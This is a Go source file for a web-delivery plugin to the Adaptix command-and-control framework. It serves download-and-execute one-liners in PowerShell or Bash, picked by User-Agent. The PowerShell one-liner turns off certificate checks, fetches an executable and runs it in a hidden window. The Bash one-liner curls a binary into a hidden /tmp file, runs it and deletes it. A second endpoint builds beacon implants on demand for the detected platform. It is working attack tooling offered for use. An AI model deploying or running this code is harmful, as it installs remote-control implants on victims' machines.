package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
	"golang.org/x/sync/singleflight"
	"gopkg.in/yaml.v3"
)

type PluginService struct{}

var (
	Ts         Teamserver
	ModuleDir  string
	Config     WebDeliveryConfig
	cache      sync.Map
	configLock sync.Mutex
	buildGroup singleflight.Group
)

type Teamserver interface {
	TsEndpointRegister(method string, path string, handler func(username string, body []byte) (int, []byte)) error
	TsEndpointRegisterPublicRaw(method string, path string, handler func(w http.ResponseWriter, r *http.Request)) error
	TsAgentBuildSyncOnce(agentName string, config string, listenersName []string) ([]byte, string, error)
	TsServiceSendDataClient(operator string, service string, data string)
	TsServiceSendDataAll(service string, data string)
}

type WebDeliveryConfig struct {
	ScriptRoute  string `yaml:"script_route" json:"script_route"`
	PayloadRoute string `yaml:"payload_route" json:"payload_route"`
	Listener     string `yaml:"listener" json:"listener"`
	AgentName    string `yaml:"agent_name" json:"agent_name"`
	AgentFormat  string `yaml:"format" json:"format"`
	Sleep        string `yaml:"sleep" json:"sleep"`
	Jitter       int    `yaml:"jitter" json:"jitter"`
	CacheTTLMin  int    `yaml:"cache_ttl_min" json:"cache_ttl_min"`
	C2HostURL    string `yaml:"c2_host_url" json:"c2_host_url"`
}

type FullConfig struct {
	ExtenderType  string            `yaml:"extender_type"`
	ExtenderFile  string            `yaml:"extender_file"`
	ServiceName   string            `yaml:"service_name"`
	ServiceConfig WebDeliveryConfig `yaml:"service_config"`
}

type CacheEntry struct {
	Payload  []byte
	Filename string
	BuiltAt  time.Time
}

func InitPlugin(ts any, moduleDir string, serviceConfig string) adaptix.PluginService {
	Ts = ts.(Teamserver)
	ModuleDir = moduleDir

	err := yaml.Unmarshal([]byte(serviceConfig), &Config)
	if err != nil {
		fmt.Println("[WebDelivery] Error parsing initial config:", err)
	}

	// Set defaults if empty
	if Config.ScriptRoute == "" {
		Config.ScriptRoute = "/deliver"
	}
	if Config.PayloadRoute == "" {
		Config.PayloadRoute = "/deliver/payload"
	}
	if Config.AgentName == "" {
		Config.AgentName = "beacon"
	}
	if Config.AgentFormat == "" {
		Config.AgentFormat = "Artifact Go Exe"
	}

	// Register Public Endpoints
	Ts.TsEndpointRegisterPublicRaw("GET", Config.ScriptRoute, handleScript)
	Ts.TsEndpointRegisterPublicRaw("GET", Config.PayloadRoute, handlePayload)

	// Register Management Endpoints
	Ts.TsEndpointRegister("POST", "/webdelivery/config", handleConfigUpdate)
	Ts.TsEndpointRegister("POST", "/webdelivery/status", handleStatus)

	// Background cache cleanup — evicts stale entries every 5 minutes
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			now := time.Now()
			cache.Range(func(key, value interface{}) bool {
				entry := value.(CacheEntry)
				if Config.CacheTTLMin > 0 && now.Sub(entry.BuiltAt) > time.Duration(Config.CacheTTLMin)*time.Minute {
					cache.Delete(key)
				}
				return true
			})
		}
	}()

	fmt.Printf("[WebDelivery] Service initialized. Script: %s, Payload: %s\n", Config.ScriptRoute, Config.PayloadRoute)

	return &PluginService{}
}

func (p *PluginService) Call(operator string, function string, args string) {}

func handleConfigUpdate(username string, body []byte) (int, []byte) {
	configLock.Lock()
	defer configLock.Unlock()

	var newConfig WebDeliveryConfig
	if err := json.Unmarshal(body, &newConfig); err != nil {
		fmt.Printf("[WebDelivery] Config update error: %v\n", err)
		resp, _ := json.Marshal(map[string]interface{}{"ok": false, "message": err.Error()})
		return 400, resp
	}

	Config = newConfig
	fmt.Printf("[WebDelivery] Config updated by %s. New Listener: %s, Agent: %s\n", username, Config.Listener, Config.AgentName)

	// Clear cache on config change to ensure new payloads use new settings
	cache = sync.Map{}

	// Attempt to persist to file
	saveConfig()

	resp, _ := json.Marshal(map[string]interface{}{"ok": true})
	return 200, resp
}

func saveConfig() {
	configPath := filepath.Join(ModuleDir, "config.yaml")

	full := FullConfig{
		ExtenderType:  "service",
		ExtenderFile:  "webdelivery.so",
		ServiceName:   "webdelivery",
		ServiceConfig: Config,
	}

	data, err := yaml.Marshal(&full)
	if err != nil {
		fmt.Printf("[WebDelivery] Error marshaling config for save: %v\n", err)
		return
	}

	err = os.WriteFile(configPath, data, 0644)
	if err != nil {
		fmt.Printf("[WebDelivery] Error saving config to %s: %v\n", configPath, err)
	} else {
		fmt.Printf("[WebDelivery] Config persisted to %s\n", configPath)
	}
}

func handleStatus(username string, body []byte) (int, []byte) {
	cacheSize := 0
	cache.Range(func(key, value interface{}) bool {
		cacheSize++
		return true
	})

	resp, _ := json.Marshal(map[string]interface{}{
		"ok":            true,
		"script_route":  Config.ScriptRoute,
		"payload_route": Config.PayloadRoute,
		"listener":      Config.Listener,
		"agent_name":    Config.AgentName,
		"format":        Config.AgentFormat,
		"cache_entries": cacheSize,
		"c2_host_url":   Config.C2HostURL,
	})
	return 200, resp
}

func handleScript(w http.ResponseWriter, r *http.Request) {
	ua := strings.ToLower(r.UserAgent())
	ip := r.RemoteAddr
	fmt.Printf("[WebDelivery] Script request from %s (UA: %s)\n", ip, ua)

	baseURL := Config.C2HostURL
	if baseURL == "" {
		scheme := "http"
		if r.TLS != nil || r.Header.Get("X-Forwarded-Proto") == "https" {
			scheme = "https"
		}
		baseURL = fmt.Sprintf("%s://%s", scheme, r.Host)
		if strings.HasSuffix(r.URL.Path, Config.ScriptRoute) {
			prefix := strings.TrimSuffix(r.URL.Path, Config.ScriptRoute)
			baseURL += prefix
		}
	}

	payloadURL := fmt.Sprintf("%s%s", strings.TrimSuffix(baseURL, "/"), Config.PayloadRoute)

	w.Header().Set("Content-Type", "text/plain")
	if strings.Contains(ua, "windows") || strings.Contains(ua, "powershell") {
		// PowerShell one-liner with optional SSL bypass
		var rnd [4]byte
		rand.Read(rnd[:])
		fmt.Fprintf(w, `$p="$env:TEMP\%x.exe"; [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; (New-Object System.Net.WebClient).DownloadFile("%s", $p); Start-Process $p -WindowStyle Hidden`,
			rnd, payloadURL)
	} else {
		// Bash one-liner — random name from crypto/rand, atomic rename before exec
		var rnd [4]byte
		rand.Read(rnd[:])
		fmt.Fprintf(w, "#!/bin/bash\np=\"/tmp/.%x\"\nt=\"${p}.tmp\"\ncurl -skL --http1.1 \"%s\" -o \"$t\"\nchmod +x \"$t\"\nmv -f \"$t\" \"$p\"\n\"$p\" &\nsleep 5\nrm -f \"$p\"\n",
			rnd, payloadURL)
	}
}

func detectOsArch(ua string) (string, string) {
	// Default to linux as it often has generic User-Agents like 'curl/7.x.x' or 'wget'
	osType := "linux"
	arch := "amd64"

	// Detect OS
	if strings.Contains(ua, "windows") || strings.Contains(ua, "powershell") || strings.Contains(ua, "msie") {
		osType = "windows"
	} else if strings.Contains(ua, "darwin") || strings.Contains(ua, "macintosh") {
		osType = "macos"
	}

	// Detect arch (independent of OS for ARM64 support on all platforms)
	if strings.Contains(ua, "x86") || strings.Contains(ua, "wow64") || strings.Contains(ua, "i686") {
		arch = "x86"
	} else if strings.Contains(ua, "arm64") || strings.Contains(ua, "aarch64") || strings.Contains(ua, "armv8") {
		arch = "arm64"
	} else if osType == "macos" && strings.Contains(ua, "arm") {
		arch = "arm64"
	}

	return osType, arch
}

func handlePayload(w http.ResponseWriter, r *http.Request) {
	ua := strings.ToLower(r.UserAgent())
	ip := r.RemoteAddr
	osType, arch := detectOsArch(ua)

	fmt.Printf("[WebDelivery] Payload request from %s | OS: %s, Arch: %s\n", ip, osType, arch)

	// Build Config JSON for the specific agent
	cfgMap := map[string]interface{}{
		"os":     osType,
		"arch":   arch,
		"format": Config.AgentFormat,
	}

	if Config.AgentName == "beacon" {
		cfgMap["sleep"] = Config.Sleep
		cfgMap["jitter"] = Config.Jitter
	} else {
		cfgMap["reconn_timeout"] = Config.Sleep
		cfgMap["reconn_count"] = 10
	}

	configJSON, _ := json.Marshal(cfgMap)

	// Cache logic
	hasher := sha256.New()
	hasher.Write([]byte(Config.AgentName + "|" + Config.Listener + "|" + Config.AgentFormat + "|" + arch + "|" + string(configJSON)))
	cacheKey := hex.EncodeToString(hasher.Sum(nil))

	if Config.CacheTTLMin > 0 {
		if val, ok := cache.Load(cacheKey); ok {
			entry := val.(CacheEntry)
			if time.Since(entry.BuiltAt) < time.Duration(Config.CacheTTLMin)*time.Minute {
				fmt.Printf("[WebDelivery] Serving %s from cache for %s\n", Config.AgentName, ip)
				serveBinary(w, entry.Payload, entry.Filename)
				return
			}
		}
	}

	// Build fresh — singleflight deduplicates concurrent requests for the same payload
	fmt.Printf("[WebDelivery] Building fresh %s for %s (Format: %s)...\n", Config.AgentName, ip, Config.AgentFormat)
	result, err, _ := buildGroup.Do(cacheKey, func() (interface{}, error) {
		payload, filename, err := Ts.TsAgentBuildSyncOnce(Config.AgentName, string(configJSON), []string{Config.Listener})
		if err != nil {
			return nil, err
		}
		if Config.CacheTTLMin > 0 {
			cache.Store(cacheKey, CacheEntry{
				Payload:  payload,
				Filename: filename,
				BuiltAt:  time.Now(),
			})
		}
		return &CacheEntry{Payload: payload, Filename: filename}, nil
	})
	if err != nil {
		fmt.Printf("[WebDelivery] Build failed: %v\n", err)
		http.Error(w, "Build error: "+err.Error(), 500)
		return
	}
	entry := result.(*CacheEntry)
	serveBinary(w, entry.Payload, entry.Filename)
}

func serveBinary(w http.ResponseWriter, payload []byte, filename string) {
	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(payload)))
	w.Write(payload)
}
